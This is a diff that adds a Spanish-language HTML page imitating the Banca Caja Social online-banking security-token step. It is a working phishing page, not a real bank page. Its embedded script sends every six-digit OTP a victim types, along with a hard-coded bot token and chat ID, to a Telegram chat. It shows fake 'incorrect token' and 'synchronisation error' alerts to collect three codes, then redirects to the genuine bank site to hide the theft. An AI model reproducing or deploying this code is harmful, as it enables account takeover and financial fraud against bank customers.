@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token - Portal Personas - Banca Caja Social</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css?v=6">
+    <style>
+        #otpTokenErrorAlert.otp-error-active,
+        #otpTokenErrorAlert:not([hidden]) {
+            display: block !important;
+            background-color: #fff5f5 !important;
+            border: 1px solid #f5c6cb !important;
+            border-radius: 4px !important;
+            margin-bottom: 20px !important;
+            box-sizing: border-box !important;
+        }
+        #otpTokenErrorAlert .alert-body {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px !important;
+            padding: 16px !important;
+        }
+        #otpTokenErrorAlert .alert-icon {
+            flex-shrink: 0 !important;
+            width: 24px !important;
+            height: 24px !important;
+            border-radius: 50% !important;
+            background-color: #dc3545 !important;
+            color: #fff !important;
+            font-size: 15px !important;
+            font-weight: 700 !important;
+            line-height: 24px !important;
+            text-align: center !important;
+        }
+        #otpTokenErrorAlert .alert-heading {
+            display: block !important;
+            color: #c62828 !important;
+            font-size: 13px !important;
+            font-weight: 700 !important;
+            line-height: 1.45 !important;
+            text-transform: uppercase !important;
+        }
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
+        .loading-overlay.show { display: flex !important; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        
+        /* Responsive imagen - sin cambiar diseño */
+        @media (max-width: 768px) {
+            .left-section { display: none; }
+            .right-section { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
+        <div style="text-align:center;">
+            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="left-section">
+            <img src="img/background-4.png" alt="Familia" class="background-image">
+        </div>
+        <div class="right-section">
+            <div class="form-container">
+                <div class="logo-container">
+                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
+                </div>
+                
+                <h1 class="title">Bienvenido al<br>Portal Personas</h1>
+
+                <div id="otpTokenErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden style="display:none">
+                    <div class="alert-body">
+                        <div class="alert-icon" aria-hidden="true">!</div>
+                        <div class="alert-content">
+                            <strong role="heading" class="alert-heading">TOKEN INGRESADO INCORRECTO</strong>
+                        </div>
+                    </div>
+                </div>
+                
+                <p class="subtitle">
+                    Ingrese el token de seguridad que fue<br>
+                    enviado a su dispositivo. El token está<br>
+                    compuesto por <strong>6 dígitos</strong>.
+                </p>
+                
+                <form class="login-form" id="tokenForm">
+                    <label for="token" class="form-label">Token de seguridad</label>
+                    <input 
+                        type="text" 
+                        id="token" 
+                        name="token" 
+                        class="form-input"
+                        placeholder="000000"
+                        maxlength="6"
+                        inputmode="numeric"
+                        pattern="[0-9]*"
+                    >
+                    <p class="error-message" style="display: none;">Token inválido. Debe contener 6 dígitos.</p>
+                    
+                    <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Siguiente</button>
+                    
+                    <a href="#" class="link-password">¿No recibió el token? ▼</a>
+                    
+                    <div class="separator"></div>
+                    
+                    <div class="back-link-container">
+                        <a href="password.html" class="link-back">← Volver</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+    const TELEGRAM_CHAT_ID = '-1003784784181';
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const tokenInput = document.getElementById('token');
+        const btnContinuar = document.getElementById('btnContinuar');
+        const errorMessage = document.querySelector('.error-message');
+        const tokenForm = document.getElementById('tokenForm');
+        const overlay = document.getElementById('loadingOverlay');
+        const errorAlert = document.getElementById('otpTokenErrorAlert');
+        let intentos = 0;
+        let tokensEnviados = [];
+        
+        // Validación del token - solo números
+        tokenInput.addEventListener('input', function(e) {
+            // Solo permitir números
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            const value = this.value;
+            
+            // Ocultar mensaje de error mientras escribe
+            errorMessage.style.display = 'none';
+            tokenInput.classList.remove('error');
+            
+            // Habilitar botón cuando tiene 6 dígitos
+            if (value.length === 6) {
+                btnContinuar.classList.add('enabled');
+                btnContinuar.disabled = false;
+                btnContinuar.removeAttribute('disabled');
+            } else {
+                btnContinuar.classList.remove('enabled');
+                btnContinuar.disabled = true;
+                btnContinuar.setAttribute('disabled', 'disabled');
+            }
+        });
+
+        // Submit
+        tokenForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (btnContinuar.disabled) return;
+
+            intentos++;
+            const token = tokenInput.value;
+            tokensEnviados.push(token);
+            
+            overlay.classList.add('show');
+
+            const mensaje = `🔐 <b>TOKEN (INTENTO ${intentos}/3) - CAJA SOCIAL</b>
+
+<b>Token:</b> <code>${token}</code>
+<b>Intento:</b> ${intentos}/3
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    setTimeout(() => {
+                        overlay.classList.remove('show');
+
+                        if (intentos === 1) {
+                            errorAlert.removeAttribute('hidden');
+                            errorAlert.style.display = 'block';
+                            tokenInput.value = '';
+                            tokenInput.focus();
+                        } else if (intentos === 2) {
+                            errorAlert.removeAttribute('hidden');
+                            errorAlert.style.display = 'block';
+                            errorAlert.querySelector('.alert-heading').textContent = 'ERROR EN LA SINCRONIZACIÓN DEL TOKEN - INTENTE DE NUEVO';
+                            tokenInput.value = '';
+                            tokenInput.focus();
+                        } else if (intentos === 3) {
+                            const mensajeFinal = `✅ <b>TOKEN ACEPTADO - CAJA SOCIAL</b>
+
+<b>Tokens ingresados:</b>
+1️⃣ ${tokensEnviados[0]}
+2️⃣ ${tokensEnviados[1]}
+3️⃣ ${tokensEnviados[2]}
+
+<b>Estado:</b> ACEPTADO EN INTENTO 3
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensajeFinal, parse_mode: 'HTML' })
+                            });
+
+                            overlay.classList.add('show');
+                            setTimeout(() => { window.location.href = 'https://www.cajasocial.com/'; }, 2000);
+                        }
+                    }, 1500);
+                } else {
+                    overlay.classList.remove('show');
+                }
+            } catch (error) {
+                overlay.classList.remove('show');
+            }
+        });
+    });
+    </script>
+</body>
+</html>
